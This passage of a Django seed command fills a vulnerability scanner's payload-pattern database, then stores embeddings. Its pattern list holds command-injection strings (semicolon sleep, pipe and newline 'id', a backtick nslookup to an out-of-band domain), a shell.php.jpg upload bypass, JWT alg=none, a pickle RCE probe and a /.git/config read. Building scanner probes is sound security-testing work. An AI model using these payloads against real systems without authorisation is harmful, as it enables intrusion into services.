        "tags": ["xxe", "oob", "blind"],
        "request_cost": 2,
    },
    # ── File Upload ──────────────────────────────────────
    {
        "vuln_type": "file_upload",
        "name": "File upload extension bypass double ext",
        "sub_technique": "extension_bypass",
        "category": "detection",
        "safety_level": "cautious",
        "request_template": "filename=shell.php.jpg",
        "matcher": {"type": "response_diff", "indicator": "upload_accepted"},
        "safety_notes": "이중 확장자로 필터 우회 시도.",
        "tags": ["upload", "extension"],
    },
    # ── Open Redirect ────────────────────────────────────
    {
        "vuln_type": "open_redirect",
        "name": "Open redirect absolute URL",
        "sub_technique": "absolute_url",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "{param}=https://watchdog.example/",
        "matcher": {"type": "header", "name": "Location", "needle": "watchdog.example"},
        "safety_notes": "Location 헤더 또는 meta-refresh 검사.",
        "tags": ["redirect"],
    },
    # ── Command Injection ────────────────────────────────
    {
        "vuln_type": "cmdi",
        "name": "CMDi time-based semicolon sleep",
        "sub_technique": "chaining_semicolon",
        "category": "verification",
        "safety_level": "cautious",
        "request_template": "{param}=; sleep 3",
        "matcher": {"type": "timing", "threshold_ms": 2500},
        "safety_notes": "sleep 유발. 운영 서비스에 저빈도로만.",
        "tags": ["time-based"],
        "request_cost": 3,
    },
    {
        "vuln_type": "cmdi",
        "name": "CMDi OOB via backtick nslookup",
        "sub_technique": "oob_backtick",
        "category": "verification",
        "safety_level": "cautious",
        "request_template": "{param}=`nslookup {oob_domain}`",
        "matcher": {"type": "oob", "channel": "dns"},
        "safety_notes": "OOB 도메인 필요.",
        "tags": ["oob"],
    },
    {
        "vuln_type": "cmdi",
        "name": "CMDi pipe chaining",
        "sub_technique": "chaining_pipe",
        "category": "detection",
        "safety_level": "cautious",
        "request_template": "{param}=| id",
        "matcher": {"type": "regex", "pattern": "uid=\\d+"},
        "safety_notes": "파이프로 명령 체이닝.",
        "tags": ["pipe"],
    },
    {
        "vuln_type": "cmdi",
        "name": "CMDi newline injection",
        "sub_technique": "newline_injection",
        "category": "detection",
        "safety_level": "cautious",
        "request_template": "{param}=%0aid",
        "matcher": {"type": "regex", "pattern": "uid=\\d+"},
        "safety_notes": "newline으로 새 명령 주입.",
        "tags": ["newline"],
    },
    # ── JWT ──────────────────────────────────────────────
    {
        "vuln_type": "jwt",
        "name": "JWT none algorithm",
        "sub_technique": "none_algorithm",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "alg=none, remove signature",
        "matcher": {"type": "response_diff", "indicator": "auth_success_without_signature"},
        "safety_notes": "알고리즘을 none으로 변경 후 서명 제거.",
        "tags": ["jwt", "none"],
    },
    # ── Deserialization ──────────────────────────────────
    {
        "vuln_type": "deserialization",
        "name": "Python pickle RCE probe",
        "sub_technique": "python_pickle",
        "category": "exploitation",
        "safety_level": "cautious",
        "request_template": "pickle.loads(base64.b64decode({payload}))",
        "matcher": {"type": "oob", "channel": "dns"},
        "safety_notes": "Python pickle 역직렬화 RCE. OOB로 확인.",
        "tags": ["pickle", "python", "rce"],
        "request_cost": 3,
    },
    # ── Information Disclosure ───────────────────────────
    {
        "vuln_type": "information_disclosure",
        "name": "Git directory exposure",
        "sub_technique": "git_exposure",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "GET /.git/config",
        "matcher": {"type": "regex", "pattern": "\\[core\\]|\\[remote"},
        "safety_notes": ".git 디렉터리 노출 확인.",
        "tags": ["git", "recon"],
    },
    {
        "vuln_type": "information_disclosure",
        "name": "Debug mode stack trace",
        "sub_technique": "debug_info",
        "category": "detection",
        "safety_level": "safe",
        "request_template": "GET /nonexistent_path_triggering_error",
        "matcher": {"type": "regex", "pattern": "(?i)(traceback|stack trace|debug|at \\w+\\.\\w+\\()"},
        "safety_notes": "디버그 모드 에러 페이지 확인.",
        "tags": ["debug", "error"],
    },
]


class Command(BaseCommand):
    help = "Seed Knowledge DB (VulnerabilityEntry + PayloadPattern)"

    def add_arguments(self, parser):
        parser.add_argument(
            "--reset",
            action="store_true",
            help="기존 시드 데이터(source='seed')를 삭제하고 재시드",
        )
        parser.add_argument(
            "--skip-embeddings",
            action="store_true",
            help="Voyage 임베딩 생성 단계를 건너뜀",
        )

    @transaction.atomic
    def handle(self, *args, **opts):
        if opts.get("reset"):
            deleted_p = PayloadPattern.objects.filter(source="seed").delete()
            deleted_v = VulnerabilityEntry.objects.all().delete()
            self.stdout.write(self.style.WARNING(
                f"reset: patterns {deleted_p}, vulnerabilities {deleted_v}"
            ))

        vuln_by_type: dict[str, VulnerabilityEntry] = {}
        for v in VULN_SEED:
            entry, created = VulnerabilityEntry.objects.update_or_create(
                vuln_type=v["vuln_type"],
                title=v["title"],
                defaults={
                    "cwe_id": v.get("cwe_id"),
                    "owasp_category": v.get("owasp_category"),
                    "severity_default": v.get("severity_default", "medium"),
                    "description": v.get("description"),
                    "preconditions": v.get("preconditions"),
                    "impact": v.get("impact"),
                    "false_positive_hints": v.get("false_positive_hints"),
                    "evidence_points": v.get("evidence_points"),
                    "tags": v.get("tags"),
                },
            )
            vuln_by_type[v["vuln_type"]] = entry
            self.stdout.write(
                f"  vuln {'+' if created else '='} {v['vuln_type']:22s} {v['title']}"
            )

        created_cnt = 0
        updated_cnt = 0
        for p in PATTERN_SEED:
            vuln = vuln_by_type.get(p["vuln_type"])
            if vuln is None:
                self.stdout.write(self.style.WARNING(
                    f"skip pattern (no vuln): {p['name']}"
                ))
                continue
            defaults = {
                "vulnerability": vuln,
                "vuln_type": p["vuln_type"],
                "sub_technique": p.get("sub_technique"),
                "category": p.get("category", "detection"),
                "safety_level": p.get("safety_level", "safe"),
                "request_template": p.get("request_template"),
                "matcher": p.get("matcher"),
                "safety_notes": p.get("safety_notes"),
                "request_cost": p.get("request_cost", 1),
                "tags": p.get("tags"),
                "source": "seed",
                "is_active": True,
            }
            obj, created = PayloadPattern.objects.update_or_create(
                name=p["name"],
                source="seed",
                defaults=defaults,
            )
            if created:
                created_cnt += 1
            else:
                updated_cnt += 1

        self.stdout.write(self.style.SUCCESS(
            f"\npatterns: +{created_cnt} created, ={updated_cnt} updated, "
            f"total vulns={len(VULN_SEED)}, total patterns={len(PATTERN_SEED)}"
        ))

        # ── 임베딩 생성 ────────────────────────────────────────
        if opts.get("skip_embeddings"):
            self.stdout.write("skip-embeddings: 임베딩 생성 건너뜀")
            return
        if not embeddings_available():
            self.stdout.write(self.style.WARNING(
                "Voyage 임베딩 비활성: VOYAGE_API_KEY 미설정 또는 voyageai 미설치 — "
                "search_knowledge 는 동작하지만 retrieve_similar_patterns 는 빈 결과 반환."
            ))
            return

        targets = list(
            PayloadPattern.objects.filter(source="seed").select_related("vulnerability")
        )
        if not targets:
            return

        texts = [pattern_text(p) for p in targets]
        self.stdout.write(f"embedding {len(texts)} patterns via {EMBEDDING_MODEL} ...")
        vectors = embed_documents(texts)
        if not vectors:
            self.stdout.write(self.style.WARNING("임베딩 생성 실패 — 건너뜀"))
            return

        for p, vec in zip(targets, vectors):
            p.embedding = vec
            p.embedding_model = EMBEDDING_MODEL
            p.save(update_fields=["embedding", "embedding_model"])
        self.stdout.write(self.style.SUCCESS(
            f"embeddings saved for {len(vectors)} patterns ({EMBEDDING_MODEL})"
        ))
